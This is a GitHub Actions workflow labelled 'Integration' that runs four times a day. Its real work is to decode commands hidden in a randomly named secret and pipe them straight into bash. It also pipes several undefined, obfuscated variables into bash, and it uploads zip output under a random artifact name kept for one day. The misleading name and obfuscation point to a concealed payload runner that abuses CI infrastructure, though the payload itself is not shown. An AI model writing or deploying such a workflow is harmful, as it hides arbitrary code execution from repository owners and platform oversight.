name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '47 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  handler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          wp156: ${{ secrets.wp156 }}
        run: |
          printf '%s' "$wp156" | jq -r .kfuyz4 | /bin/bash
          printf '%s' "$urxdl30" | jq -r .rjb2632 | /bin/bash
          printf '%s' "$sxph6248" | jq -r .s00256 | /bin/bash
          echo $suext4 | jq -r .e2 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: BbseT2Ms
          path: "*.zip"
          retention-days: 1
